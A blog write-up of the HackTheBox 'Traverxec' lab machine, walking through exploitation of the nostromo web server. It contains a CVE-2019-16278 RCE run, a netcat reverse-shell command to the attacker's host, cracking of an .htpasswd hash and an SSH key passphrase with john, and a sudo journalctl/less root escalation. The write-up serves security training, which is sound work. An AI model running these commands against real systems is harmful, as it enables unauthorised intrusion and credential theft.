<!DOCTYPE html>
<html lang=en>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Traverxec was in my opinion a particular and interesting box. While being rated easy it still teach me a little trick and got me very frustrated at some point because it was super easy to overlook a">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Traverxec">
<meta property="og:url" content="https://hg8.sh/posts/traverxec/index.html">
<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
<meta property="og:description" content="Traverxec was in my opinion a particular and interesting box. While being rated easy it still teach me a little trick and got me very frustrated at some point because it was super easy to overlook a">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82158714-d03fb900-9889-11ea-865c-4edee3e92884.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/71325453-6e9f3c80-24ed-11ea-8507-3c758091d65c.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/71325488-f4bb8300-24ed-11ea-9885-e4ef90f7d370.png">
<meta property="article:published_time" content="2020-04-10T22:00:00.000Z">
<meta property="article:modified_time" content="2020-05-27T11:38:47.389Z">
<meta property="article:author" content="hg8">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="john">
<meta property="article:tag" content="traverxec">
<meta property="article:tag" content="nhttpd">
<meta property="article:tag" content="nostromo">
<meta property="article:tag" content="Directory Transversal">
<meta property="article:tag" content="CVE-2019-16278">
<meta property="article:tag" content="journalctl">
<meta property="article:tag" content="less">
<meta property="article:tag" content="GTFOBins">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82158714-d03fb900-9889-11ea-865c-4edee3e92884.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
     
    <title>HackTheBox - Traverxec :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
<link rel="stylesheet" href="/css/style.css">

    
    
<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/posts/mango/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/posts/registry/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
    </span>
    <br/>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-david"><span class="toc-number">1.2.</span> <span class="toc-text">Pivot www-data -&gt; david</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Additional-notes"><span class="toc-number">3.</span> <span class="toc-text">Additional notes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#htpassw-bruteforce"><span class="toc-number">3.1.</span> <span class="toc-text">.htpassw bruteforce</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        <header id="header">
  <a href="/">
  
      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
  
    <span class="logo__mark"></span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Posts</a></li>
       
        <li><a href="/search/">Search</a></li>
      
    </ul>
  </div>
</header>

        
          <br>
          <br>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - Traverxec
    </h1>



    <div class="meta"> 
      
    <div class="postdate">
      
        <time datetime="2020-04-10T22:00:00.000Z" itemprop="datePublished">11-04-2020</time>
        
      
    </div>


      — Written by 
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hg8</span>
      </span>
      —
      10 min read
    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <img width="581" alt="traverxec-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158714-d03fb900-9889-11ea-865c-4edee3e92884.png">

<p>Traverxec was in my opinion a particular and interesting box. While being rated easy it still teach me a little trick and got me very frustrated at some point because it was super easy to overlook and overthink easy things. Still it was worth cogitate on it! </p>
<p><strong>Tl;Dr:</strong> The user flag was accessible after using a Remote Code Execution exploit on the <code>nhttpd</code> web server running, giving us access to the <code>www-data</code> user. From here you were able to <em>enter</em> the user home directory and access to a backup archive containing its SSH private key. After brute-forcing the passphrase you could connect to the user account and grab the flag.<br>The root flag consisted in exploiting a misconfiguration in <code>sudo</code> config allowing to view <code>journalctl</code> entries as <code>root</code> without password. Since <code>journalctl</code> use <code>less</code> as a pager it was possible to break out from <code>less</code> running as <code>root</code> by spawning an interactive system shell.</p>
<p>Alright! Let’s get into the details now!</p>
<hr>
<p>First thing first, let’s add the box IP to the hosts file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.165 traverxec.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>and let’s start!</p>
<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC traverxec.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-18 15:36 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> traverxec.htb (10.10.10.165)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp open  http    nostromo 1.9.6</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>We have something super classical: A HTTP (port 80) and SSH (port 22) service open.  </p>
<p>But in this result something immediately catch the eye : <code>nostromo 1.9.6</code>. That’s a really not common web server.  </p>
<p>According to its <a href="https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd" target="_blank" rel="noopener">documentation</a>: </p>
<blockquote>
<p>nhttpd is a simple, fast and secure HTTP server.  It runs as a single<br>process, handling connections with select(2).</p>
</blockquote>
<p>And actually while searching for informations about this web server (out of curiosity) the second result on Google was about a RCE vulnerability through directory transversal on version &lt;= 1.9.6 (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-16278" target="_blank" rel="noopener">CVE-2019-16278</a>).<br>A bash proof-of-concept is also <a href="https://git.sp0re.sh/sp0re/Nhttpd-exploits" target="_blank" rel="noopener">available</a>. Seems like we don’t need to search any further…  </p>
<p>Let’s give it a try:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ git <span class="built_in">clone</span> https://git.sp0re.sh/sp0re/Nhttpd-exploits.git</span><br><span class="line">Cloning into <span class="string">'Nhttpd-exploits'</span>...</span><br><span class="line">remote: Enumerating objects: 5, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (5/5), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (5/5), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 5 (delta 0), reused 0 (delta 0)</span><br><span class="line">Unpacking objects: 100% (5/5), <span class="keyword">done</span>.</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">cd</span> Nhttpd-exploits</span><br><span class="line">[hg8@archbook ~]$ bash CVE-2019-16278.sh traverxec.htb 80 id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<p>That was fast!  </p>
<p><em>Note: Be careful when launching exploit, do not use CVE-2019-16279.sh since it will DoS the box (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-16279" target="_blank" rel="noopener">CVE-2019-16279</a>)… It was a very hard box to solve because it would constantly get down probably because of people launching the wrong exploit by mistake.</em></p>
<p>Let’s now use it to open a reverse shell. First we start our listener:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>

<p>And launch the exploit :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ bash CVE-2019-16278.sh traverxec.htb 80 <span class="string">"nc -e /bin/sh 10.10.10.10 8585"</span></span><br></pre></td></tr></table></figure>

<p>We get the connection immediately: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.165:40048</span><br><span class="line">www-data@traverxec:/$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<p>First thing first let’s see what the user is to locate the <code>user.txt</code> flag:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ ls -la /home/</span><br><span class="line">drwx--x--x  6 david david 4096 Nov 19 05:28 david</span><br><span class="line">www-data@traverxec:/$ ls -la /home/david/</span><br><span class="line">ls: cannot open directory <span class="string">'/home/david/'</span>: Permission denied</span><br></pre></td></tr></table></figure>

<p>The user is <code>david</code> but unfortunately we have no rights to read or write files in his home directory. Let’s move on, we might find additional informations later.  </p>
<h3 id="Pivot-www-data-gt-david"><a href="#Pivot-www-data-gt-david" class="headerlink" title="Pivot www-data -&gt; david"></a>Pivot www-data -&gt; david</h3><p>Looking around we find the configuration of the <code>nostromo</code> web server, hopefully we can find juicy informations there ?</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ cat /var/nostromo/conf/nhttpd.conf</span><br><span class="line"><span class="comment"># MAIN [MANDATORY]</span></span><br><span class="line">servername        traverxec.htb</span><br><span class="line">serverlisten        *</span><br><span class="line">serveradmin        david@traverxec.htb</span><br><span class="line">serverroot        /var/nostromo</span><br><span class="line">servermimes        conf/mimes</span><br><span class="line">docroot            /var/nostromo/htdocs</span><br><span class="line">docindex        index.html</span><br><span class="line"><span class="comment"># LOGS [OPTIONAL]</span></span><br><span class="line">logpid            logs/nhttpd.pid</span><br><span class="line"><span class="comment"># SETUID [RECOMMENDED]</span></span><br><span class="line">user            www-data</span><br><span class="line"><span class="comment"># BASIC AUTHENTICATION [OPTIONAL]</span></span><br><span class="line">htaccess        .htaccess</span><br><span class="line">htpasswd        /var/nostromo/conf/.htpasswd</span><br><span class="line"><span class="comment"># ALIASES [OPTIONAL]</span></span><br><span class="line">/icons            /var/nostromo/icons</span><br><span class="line"><span class="comment"># HOMEDIRS [OPTIONAL]</span></span><br><span class="line">homedirs        /home</span><br><span class="line">homedirs_public        public_www</span><br></pre></td></tr></table></figure>

<p>The configuration gives the path to an <code>.htpasswd</code> file :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ cat /var/nostromo/conf/.htpasswd</span><br><span class="line">david:<span class="variable">$1</span><span class="variable">$e7NfNpNi</span><span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/</span><br></pre></td></tr></table></figure>

<p>Maybe if we brute-force the password of this <code>.htpasswd</code> file we can reuse the found password to login as <code>david</code> to ssh. Let’s give it a try:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"<span class="variable">$1</span><span class="variable">$e7NfNpNi</span><span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/"</span> &gt; david.hash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt david.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (md5crypt, crypt(3) <span class="variable">$1</span>$ (and variants) [MD5 128/128 AVX 4x3])</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Nowonly4me       (?)</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>Alright! We managed to get the password. That’s a good news and a nice step. Let’s try to login as <code>david</code> now:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh david@traverxec.htb</span><br><span class="line">david@traverxec.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br></pre></td></tr></table></figure>

<p>No luck… <code>su - david</code> maybe ?</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ su - david</span><br><span class="line">Password:</span><br><span class="line">su: Authentication failure</span><br><span class="line">www-data@traverxec:/$</span><br></pre></td></tr></table></figure>

<p>Nop! Looks like a dead end here… Let’s go back at the beginning to make sure we didn’t miss anything. </p>
<p>First let’s check again the <code>nhttpd.conf</code> file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf</span><br><span class="line">[...]</span><br><span class="line"><span class="comment"># HOMEDIRS [OPTIONAL]</span></span><br><span class="line">homedirs        /home</span><br><span class="line">homedirs_public        public_www</span><br></pre></td></tr></table></figure>

<p>This <code>HOMEDIRS</code> option catch my eye, does that mean we could access <code>david</code> home directory using the web-server ? Let’s check the documentation:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ man nhttpd</span><br><span class="line">HOMEDIRS</span><br><span class="line">To serve the home directories of your users via HTTP, <span class="built_in">enable</span> the homedirs option by defining the path <span class="keyword">in</span> <span class="built_in">where</span> the home directories are stored, normally /home. To access a users home directory enter a ~ <span class="keyword">in</span> the URL followed by the home directory name like <span class="keyword">in</span> this example:</span><br><span class="line">http://www.nazgul.ch/~hacki/</span><br><span class="line">The content of the home directory is handled exactly the same way as a directory <span class="keyword">in</span> your document root. If some users don<span class="string">'t want that their home directory can be accessed via HTTP, they shall remove the world readable flag on their home directory and a caller will receive a 403 Forbidden response. Also, if basic authentication is enabled, a user can create an .htaccess file in his home directory and a caller will need to authenticate.</span></span><br><span class="line"><span class="string">You can restrict the access within the home directories to a single sub directory by defining it via the homedirs_public option.</span></span><br></pre></td></tr></table></figure>

<p>Thats interesting!<br>Ok so we know our user is David, can we access his homedir?</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://traverxec.htb/\~david/</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;&lt;font style="sans-serif"&gt;</span><br><span class="line">&lt;h1&gt;Private space.&lt;br&gt;Nothing here.</span><br><span class="line">&lt;br&gt;Keep out!&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>“Nothing to see here”… That’s true, and running <code>gobuster</code> won’t help either. We need to find a way to list files and directories in <code>david</code> homedir, but how ? And this is where I got frustrated… After searching for a while I realized I overlooked something obvious. Let’s check again the permissions of <code>david</code> homedir:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ ls -l /home/david/</span><br><span class="line">ls: cannot open directory <span class="string">'/home/david'</span>: Permission denied</span><br><span class="line">www-data@traverxec:/$ ls -l /home/</span><br><span class="line">total 4</span><br><span class="line">drwx--x--x 5 david david 4096 Dec 22 12:15 david</span><br></pre></td></tr></table></figure>

<p>We indeed have no read nor write permissions, but we do have execute bit is set (<code>x</code>).   </p>
<p>For a binary the <code>x</code> bit mean the file can be executed. But for directory, what does it mean then ? </p>
<blockquote>
<p>The execute bit (<code>x</code>) allows the affected user to enter the directory, and access files and directories inside.</p>
</blockquote>
<p>So we can not read nor write <code>david</code> homedir but we can enter it! Let’s give a try:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ <span class="built_in">cd</span> /home/david/public_www/</span><br><span class="line"><span class="built_in">cd</span> /home/david/public_www/</span><br><span class="line">www-data@traverxec:/home/david/public_www$ ls -l</span><br><span class="line">ls -l</span><br><span class="line">total 8</span><br><span class="line">-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html</span><br><span class="line">drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area</span><br></pre></td></tr></table></figure>

<p>It worked! Once inside we notice another interesting folder: <code>protected-file-area</code>. Let’s see what’s it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ ls</span><br><span class="line">backup-ssh-identity-files.tgz</span><br></pre></td></tr></table></figure>

<p>A backup of ssh identity files ? This sure looks promising. Let’s extract it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ mkdir /tmp/.tmp</span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ tar -xzf backup-ssh-identity-files.tgz -C /tmp/.tmp</span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ <span class="built_in">cd</span> /tmp/.tmp/home/david/</span><br><span class="line">www-data@traverxec:/tmp/tmp/home/david$ ls -la .ssh/</span><br><span class="line">-rw-r--r-- 1 www-data www-data  397 Oct 25 17:02 authorized_keys</span><br><span class="line">-rw------- 1 www-data www-data 1766 Oct 25 17:02 id_rsa</span><br><span class="line">-rw-r--r-- 1 www-data www-data  397 Oct 25 17:02 id_rsa.pub</span><br></pre></td></tr></table></figure>

<p>Jackpot! We can now try to use this ssh key to access <code>david</code> account:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa david@traverxec.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa'</span>:</span><br></pre></td></tr></table></figure>

<p>It couldn’t have been this easy right? A passphrase is needed for this ssh key. Let’s fire <code>john</code> to see if we can brute-force the passphrase:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh2john id_rsa &gt; id_rsa.hash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">hunter           (ssh/id_rsa)</span><br><span class="line">Warning: Only 1 candidate left, minimum 2 needed <span class="keyword">for</span> performance.</span><br><span class="line">1g 0:00:00:12 DONE (2019-11-18 11:06) 0.08012g/s 1149Kp/s 1149Kc/s 1149KC/s *7¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p><code>john</code> found <code>hunter</code> as a passphrase. We have all the pieces to login now:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa david@traverxec.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa'</span>:</span><br><span class="line">Linux traverxec 4.19.0-6-amd64 <span class="comment">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span></span><br><span class="line">david@traverxec:~$ cat user.txt</span><br><span class="line">7xxxxxxxxxxxxxxxxxxxxxd</span><br></pre></td></tr></table></figure>

<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>First thing first, let’s check what’s inside <code>david</code> home directory:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">david@traverxec:~$ ls -l</span><br><span class="line">total 12</span><br><span class="line">drwx------ 2 david david 4096 Dec 22 12:41  bin</span><br><span class="line">drwxr-xr-x 3 david david 4096 Oct 25 15:45  public_www</span><br><span class="line">-r--r----- 1 root  david   33 Oct 25 16:14  user.txt</span><br><span class="line">david@traverxec:~$ ls -l bin</span><br><span class="line">total 8</span><br><span class="line">-r-------- 1 david david 802 Oct 25 16:26 server-stats.head</span><br><span class="line">-rwx------ 1 david david 363 Oct 25 16:26 server-stats.sh</span><br></pre></td></tr></table></figure>

<p>Let’s first focus on the <code>bin</code> folder and <code>server-stats.sh</code> script:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">david@traverxec:~/bin$ cat server-stats.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">cat /home/david/bin/server-stats.head</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Load: `/usr/bin/uptime`"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">" "</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">" "</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Last 5 journal log lines:"</span></span><br><span class="line">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat</span><br></pre></td></tr></table></figure>

<p>The line about <code>journalctl</code> looks particularly interesting since it’s used with <code>sudo</code> command without password. If we can abuse this <code>journalctl</code> command we can potentially escalate our privileges to root. </p>
<p>The best resource for finding example of abusing legitimate binaries is <a href="https://gtfobins.github.io/" target="_blank" rel="noopener"><code>GTFOBins</code></a>:</p>
<blockquote>
<p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>
<p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or  maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p>
</blockquote>
<p>According to it, <code>journalctl</code> can be used to elevate privileges thanks to the pager used (<code>less</code>): </p>
<blockquote>
<p><code>Less</code> can be used to break out from restricted environments by spawning an interactive system shell.</p>
</blockquote>
<p>Let’s give it a try:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</span><br><span class="line">-- Logs begin at Mon 2019-11-18 07:00:54 EST, end at Mon 2019-11-18</span><br><span class="line">Nov 18 07:00:58 traverxec systemd[1]: Starting nostromo nhttpd serv</span><br><span class="line">Nov 18 07:00:58 traverxec systemd[1]: nostromo.service: Can<span class="string">'t open</span></span><br><span class="line"><span class="string">Nov 18 07:00:58 traverxec nhttpd[477]: started</span></span><br><span class="line"><span class="string">Nov 18 07:00:58 traverxec nhttpd[477]: max. file descriptors = 1040</span></span><br><span class="line"><span class="string">Nov 18 07:00:58 traverxec systemd[1]: Started nostromo nhttpd serve</span></span><br><span class="line"><span class="string">!/bin/sh</span></span><br><span class="line"><span class="string"># bash</span></span><br><span class="line"><span class="string">root@traverxec:/home/david/bin# cd</span></span><br><span class="line"><span class="string">root@traverxec:~# ls</span></span><br><span class="line"><span class="string">nostromo_1.9.6-1.deb  root.txt</span></span><br><span class="line"><span class="string">root@traverxec:~# cat root.txt</span></span><br><span class="line"><span class="string">9xxxxxxxxxxxxxxxxx6</span></span><br></pre></td></tr></table></figure>

<p>Now that we are root and done let’s not forget to clean up our changes to not spoil other users!</p>
